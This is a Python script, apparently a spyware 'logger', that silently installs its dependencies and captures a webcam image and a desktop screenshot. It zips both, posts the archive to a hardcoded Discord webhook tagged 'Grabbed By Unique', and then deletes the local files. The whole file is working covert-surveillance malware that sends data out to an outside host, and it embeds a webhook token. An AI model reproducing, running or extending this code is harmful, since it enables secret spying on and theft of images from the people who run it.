import cv2
import pyautogui
import discord
import requests
import os
import zipfile
from io import BytesIO
import subprocess

# Constants
WEBCAM_FILE = "webcam_screenshot.png"
DESKTOP_FILE = "desktop_screenshot.png"
ZIP_FILE = "Files-Tooken.zip"

# install pakages on ran
def install_dependencies():
    dependencies = [
        'opencv-python',
        'pyautogui',
        'discord.py',
        'requests',
    ]

    try:
        subprocess.run(['pip', 'install'] + dependencies, check=True)
        print("Dependencies installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error installing dependencies: {e}")

# Capture screenshots
def capture_webcam_screenshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite(WEBCAM_FILE, frame)
    cap.release()  # Release the webcam capture

def capture_desktop_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(DESKTOP_FILE)

# Create a zip file for screenshots
def create_zip():
    with zipfile.ZipFile(ZIP_FILE, 'w') as zipf:
        # Create a folder called "webcam" in the zip file
        zipf.write(WEBCAM_FILE, arcname="webcam/{}".format(os.path.basename(WEBCAM_FILE)))
        # Create a folder called "desktop" in the zip file
        zipf.write(DESKTOP_FILE, arcname="desktop/{}".format(os.path.basename(DESKTOP_FILE)))

# Send zip file to Discord
def send_to_discord():
    discord_webhook_url = "https://discord.com/api/webhooks/1180297923548946443/8Hl5RMbtST9GpBESButxHJ1ifYDkvlqqUPq79tEliqrlJ8P6leDIOnsi5DA8qedqg2Rk"
    webhook_name = "--Unique Logger-_-"
    webhook_avatar_url = "https://media.discordapp.net/attachments/1177429498531156078/1178174608864714874/UPFP.png?ex=65752f9c&is=6562ba9c&hm=6ce68ddcf0bd9321412c2432931cb0bcd7569f041baf277693212d77d9715ddf&=&format=webp&quality=lossless&width=671&height=671"

    # Check if the webhook URL is provided
    if not discord_webhook_url:
        print("Error: Discord webhook URL is not provided.")
        return

    try:
        # Capture screenshots
        capture_webcam_screenshot()
        capture_desktop_screenshot()

        # Create a zip file
        create_zip()

        # Open the zip file and read its content
        with open(ZIP_FILE, 'rb') as zip_file:
            zip_data = zip_file.read()

        # Send data to Discord with custom name, content, and embed
        files = {
            "file1": (ZIP_FILE, zip_data),
        }

        payload = {
            "content": "`Screenshots from webcam and desktop` Grabbed By Unique | https://discord.gg/dupsDwa2rN",
            "username": webhook_name,
            "avatar_url": webhook_avatar_url,
        }

        response = requests.post(discord_webhook_url, data=payload, files=files)

        if response.status_code == 204:
            print("Screenshots successfully sent to Discord.")
        else:
            print(f"Error: {response.status_code} - {response.text}")

    except Exception as e:
        print(f"Error during request: {e}")

    finally:
        # Clean up: remove temporary files
        os.remove(WEBCAM_FILE)
        os.remove(DESKTOP_FILE)
        os.remove(ZIP_FILE)

if __name__ == "__main__":
    install_dependencies()
    send_to_discord()
    print("Dont Worry About The Error It Still Works! if there is a problem (still in beta!) ask for help IN ARE DISCORD! --> https://discord.gg/dupsDwa2rN")